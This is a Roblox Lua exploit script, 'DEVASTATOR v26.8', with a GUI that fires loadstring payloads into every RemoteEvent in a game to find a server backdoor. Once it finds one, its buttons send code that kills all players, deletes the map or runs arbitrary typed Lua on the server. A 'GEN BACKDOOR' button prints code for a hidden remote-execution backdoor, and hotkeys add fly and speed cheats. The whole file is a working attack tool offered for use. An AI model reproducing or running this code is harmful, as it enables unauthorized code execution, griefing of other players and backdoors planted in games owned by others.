--[[
    DEVASTATOR v26.8 // DEEP SCAN & AUTO-BREACH
    STATUS: AGGRESSIVE
    HOTKEYS: 'L' - Hide UI | 'E' - Fly | 'Q' - Speed Up
]]

local p = game:GetService("Players")
local lp = p.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local cg = game:GetService("CoreGui")
local lit = game:GetService("Lighting")

-- [1] UI INITIALIZATION
if cg:FindFirstChild("DevAggressive") then cg.DevAggressive:Destroy() end
local sg = Instance.new("ScreenGui", cg) sg.Name = "DevAggressive"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 550, 0, 480)
main.Position = UDim2.new(0.5, -275, 0.5, -240)
main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
main.Active = true
main.Draggable = true 
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main) stroke.Color = Color3.new(1,0,0) stroke.Thickness = 2

-- ЗАГОЛОВОК
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = " DEVASTATOR v26.8 // BREACH STATUS: IDLE"
title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Code
Instance.new("UICorner", title)

-- ТЕРМИНАЛ
local logs = Instance.new("ScrollingFrame", main)
logs.Size = UDim2.new(1, -20, 0, 120)
logs.Position = UDim2.new(0, 10, 1, -130)
logs.BackgroundColor3 = Color3.new(0, 0, 0)
local lay = Instance.new("UIListLayout", logs)

local function log(txt, col)
    local l = Instance.new("TextLabel", logs)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = " [>] " .. tostring(txt)
    l.TextColor3 = col or Color3.new(1, 0, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextXAlignment = Enum.TextXAlignment.Left
    logs.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y)
    logs.CanvasPosition = Vector2.new(0, 9999)
end

-- [2] АГРЕССИВНОЕ ЯДРО (SCAN & BREACH)
local ss_event = nil

local function ss_send(id, val)
    if ss_event then
        ss_event:FireServer(id, val)
        log("SENT TO SERVER: " .. tostring(id), Color3.new(0,1,0))
    else
        log("NO SERVER CONNECTION. TRYING LOCAL.", Color3.new(1,0.5,0))
        if id == 882 then
            local sk = lit:FindFirstChildOfClass("Sky") or Instance.new("Sky", lit)
            sk.SkyboxBk = val sk.SkyboxDn = val sk.SkyboxFt = val
        end
    end
end

local function scanAndBreach()
    log("DEEP SCAN INITIALIZED...", Color3.new(1, 1, 0))
    local remotes = 0
    ss_event = nil
    
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            remotes = remotes + 1
            
            -- Агрессивный тест: пытаемся отправить команду в каждый эвент
            task.spawn(function()
                pcall(function()
                    v:FireServer(771, "print('DEVASTATOR BREACH TEST')")
                    v:FireServer("loadstring", "print('DEVASTATOR BREACH TEST')")
                end)
            end)
            
            -- Поиск по именам (бэкдоры)
            local n = v.Name:lower()
            local targets = {"network", "internal", "status", "handshake", "remote", "event", "admin", "core"}
            for _, t in pairs(targets) do
                if n:find(t) then
                    ss_event = v
                    title.Text = " STATUS: POTENTIAL HOLE (" .. v.Name .. ")"
                    log("TARGET LOCKED: " .. v.Name, Color3.new(0, 1, 0))
                end
            end
        end
    end
    
    if remotes > 0 then
        log("SCAN FINISHED. FOUND " .. remotes .. " CHANNELS.", Color3.new(1, 1, 1))
    else
        log("CRITICAL: NO EVENTS FOUND. GAME PROTECTED.", Color3.new(1, 0, 0))
    end
end

-- [3] ИНТЕРФЕЙС
local inp = Instance.new("TextBox", main)
inp.Size = UDim2.new(0, 350, 0, 30)
inp.Position = UDim2.new(0.5, -175, 0, 50)
inp.PlaceholderText = "ASSET ID / LUA CODE"
inp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
inp.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", inp)

local g = Instance.new("Frame", main)
g.Size = UDim2.new(1, -20, 0, 200)
g.Position = UDim2.new(0, 10, 0, 95)
g.BackgroundTransparency = 1
Instance.new("UIGridLayout", g).CellSize = UDim2.new(0, 170, 0, 35)

local function btn(txt, cb, col)
    local b = Instance.new("TextButton", g)
    b.Text = txt
    b.BackgroundColor3 = col or Color3.fromRGB(50, 0, 0)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

-- КНОПКИ ПАНЕЛИ
btn("AUTO BREACH", scanAndBreach, Color3.fromRGB(150, 0, 150))
btn("GIVE HAMMER", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("Hammer Given") end)
btn("GLOBAL SKY", function() ss_send(882, "rbxassetid://"..inp.Text) end)
btn("GLOBAL AUDIO", function() ss_send(993, "rbxassetid://"..inp.Text) end)
btn("KILL ALL", function() ss_send(771, "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end") end, Color3.fromRGB(120, 0, 0))
btn("NUKE MAP", function() ss_send(771, "for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') then v:Destroy() end end") end, Color3.fromRGB(120, 0, 0))
btn("REMOTE EXEC", function() ss_send(771, inp.Text) end, Color3.fromRGB(0, 120, 0))
btn("GEN BACKDOOR", function()
    print("local r=Instance.new('RemoteEvent',game:GetService('ReplicatedStorage')) r.Name='NetworkStream' r.OnServerEvent:Connect(function(_,i,v) if i==771 then loadstring(v)() end end)")
    log("CODE IN F9 CONSOLE")
end, Color3.fromRGB(100, 100, 0))

-- [4] FLY & HOTKEYS
local flying = false
local speed = 50
uis.InputBegan:Connect(function(k, m)
    if m then return end
    if k.KeyCode == Enum.KeyCode.E then
        flying = not flying
        local char = lp.Character or lp.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        if flying then
            log("FLY: ON", Color3.new(0,1,0))
            task.spawn(function()
                local bv = Instance.new("BodyVelocity", hrp)
                bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
                while flying do
                    local cam = workspace.CurrentCamera
                    local move = Vector3.new(0,0,0)
                    if uis:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
                    if uis:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
                    if uis:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
                    if uis:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
                    bv.Velocity = move * speed
                    task.wait()
                end
                bv:Destroy()
            end)
        else log("FLY: OFF", Color3.new(1,0,0)) end
    elseif k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible
    elseif k.KeyCode == Enum.KeyCode.Q then speed = speed + 20 log("SPEED: "..speed) end
end)

log("DEVASTATOR v26.8 AGGRESSIVE LOADED.")
